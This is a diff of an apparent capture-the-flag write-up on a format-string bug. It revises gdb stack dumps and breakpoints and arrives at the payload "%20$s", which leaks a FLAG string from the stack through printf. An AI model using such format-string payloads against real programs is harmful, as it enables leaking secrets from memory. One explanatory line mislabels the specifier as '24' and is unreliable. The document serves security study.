@@ -121,19 +121,19 @@ Argument required (starting display address).
 0xffffd030:     0xf7f9ada0      0x00000000      0x08048369      0x0804c034
 0xffffd040:     0xf7ffda40      0xf7fd6f20      0x08048369      0xf7ffda40
 ```
-- 0xffffd090 is FLAG address -> the stack frmae of FLAG
-- Continue breakpoint right the scanf function at 0x080492c8
+- 0xffffd090 is FLAG address -> the stack frame of FLAG
+- Continue breakpoint right the printf function (that print the story variable) at 0x080492ec
 ```assembly
-Breakpoint 1, 0x080492c8 in vuln() ()
-(gdb) x/100x $sp
-0xffffd000:     0x0804a093      0xffffd010      0xf7d86374      0x0804928e
-0xffffd010:     0xf7fbe4a0      0xffffffff      0xffffd094      0xf7d81e54
+Breakpoint 1, 0x080492ec in vuln() ()
+(gdb)  x/100x $sp
+0xffffd000:     0xffffd010      0xffffd010      0xf7d86374      0x0804928e
+0xffffd010:     0xf7fb0061      0xffffffff      0xffffd094      0xf7d81e54
 0xffffd020:     0xf7fbe4a0      0xf7fd0294      0xf7d79674      0xf7f9a000
 0xffffd030:     0xf7f9ada0      0x00000000      0x08048369      0x0804c034
 0xffffd040:     0xf7ffda40      0xf7fd6f20      0x08048369      0xf7ffda40
 0xffffd050:     0xffffd090      0xf7ffdc0c      0xf7fbe7c0      0x00000001
 ```
-- From the current the stack frame that esp point to (0x0804a093) the stack frame of FLAG (0xffffd090) need 20 stack frame including the FLAG stackframe. So we can use this payload to leak the FLAG: "%20$s"
+- From the current the stack frame that esp point to (0xffffd010) the stack frame of FLAG (0xffffd090) need 20 stack frame including the FLAG stackframe. So we can use this payload to leak the FLAG: "%20$s"
 ```c
 % : This marks the beginning of a format specifier.
 24 : This is a positional argument specifier. It means that printf should use the 20th argument in the list provided to it.
